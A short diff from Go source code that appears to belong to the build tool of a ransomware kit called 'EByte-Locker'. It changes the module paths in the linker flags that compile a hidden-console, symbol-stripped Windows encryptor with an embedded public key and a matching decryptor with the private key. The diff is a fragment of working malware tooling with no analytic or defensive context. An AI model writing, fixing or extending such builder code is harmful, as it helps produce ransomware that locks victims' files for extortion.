@@ -60,7 +60,7 @@ func compileEncryptor(pubKeyHex string, lockerID string) error {
 		return fmt.Errorf("failed to replace Locker ID in Encryptor: %w", err)
 	}
 
-	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'EByte-Locker/configuration.PublicKey=%s'", pubKeyHex)
+	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'EByte-Rware/configuration.PublicKey=%s'", pubKeyHex)
 	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../EByteLocker-Built.exe")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
@@ -103,7 +103,7 @@ func compileDecryptor(privKeyHex string) error {
 		return fmt.Errorf("failed to change directory to Decryptor: %w", err)
 	}
 
-	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'EByte-Locker/configuration.PrivateKey=%s'", privKeyHex)
+	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'EByte-Rware-Decryptor/configuration.PrivateKey=%s'", privKeyHex)
 	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../Decryptor-Built.exe")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
